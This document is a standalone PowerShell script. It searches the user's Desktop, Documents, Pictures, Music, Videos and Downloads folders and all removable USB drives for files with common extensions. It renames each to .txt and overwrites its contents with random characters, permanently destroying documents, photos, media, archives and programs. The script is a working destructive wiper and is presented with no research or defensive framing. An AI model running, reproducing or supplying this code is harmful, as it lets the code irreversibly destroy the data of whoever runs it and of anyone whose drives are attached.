# List of target directories
$directories = "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Music", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Videos", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads"

# List of file extensions to rename
$extensions = "*.exe", "*.json", "*.doc", "*.pdf", "*.wpd", "*.docx", "*.rtf", "*.tex", "*.odt", "*.jpg", "*.jpeg", "*.mp3", "*.rar", "*.vcd", "*.webp", "*.css", "*.html", "*.py", "*.php", "*.ico", "*.lnk", "*.mp4", "*.js", "*.bak", "*.xml", "*.zip", "*.bmp"

# Generate random content
function Generate-RandomContent {
    $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    $contentLength = Get-Random -Minimum 100 -Maximum 1000
    $randomContent = -join (Get-Random -InputObject $characters -Count $contentLength)

    return $randomContent
}

# Function to process files in a USB drive
function Process-USBFiles {
    param (
        [string]$driveLetter
    )

    # Get all files with specified extensions in the USB drive
    $usbFiles = Get-ChildItem -Path $driveLetter -Recurse -File -Include $extensions

    # Rename each file and change contents to random data
    foreach ($usbFile in $usbFiles) {
        $newName = $usbFile.Name -replace "\.(exe|json|doc|pdf|wpd|docx|rtf|tex|odt|jpg|jpeg|mp3|rar|vcd|webp|css|html|py|php|ico|lnk|mp4|js|bak|xml|zip|bmp)$", ".txt"
        Rename-Item -Path $usbFile.FullName -NewName $newName
        $randomContent = Generate-RandomContent
        $newFilePath = Join-Path -Path $usbFile.Directory.FullName -ChildPath $newName
        Set-Content -Path $newFilePath -Value $randomContent
    }
}

# Loop through each directory
foreach ($directory in $directories) {
    # Get all files with specified extensions in the current directory and subdirectories
    $files = Get-ChildItem -Path $directory -File -Recurse -Include $extensions

    # Rename each file and change contents to random data
    foreach ($file in $files) {
        $newName = $file.Name -replace "\.(exe|json|doc|pdf|wpd|docx|rtf|tex|odt|jpg|jpeg|mp3|rar|vcd|webp|css|html|py|php|ico|lnk|mp4|js|bak|xml|zip|bmp)$", ".txt"
        Rename-Item -Path $file.FullName -NewName $newName
        $randomContent = Generate-RandomContent
        $newFilePath = Join-Path -Path $file.Directory.FullName -ChildPath $newName
        Set-Content -Path $newFilePath -Value $randomContent
    }
}

# Process files in USB drives
$usbDrives = Get-WmiObject -Class Win32_Volume | Where-Object { $_.DriveType -eq 2 } | Select-Object -ExpandProperty Name

foreach ($usbDrive in $usbDrives) {
    Process-USBFiles -driveLetter $usbDrive
}

Write-Host "File renaming and content change completed."
Read-Host "Press Enter to exit."
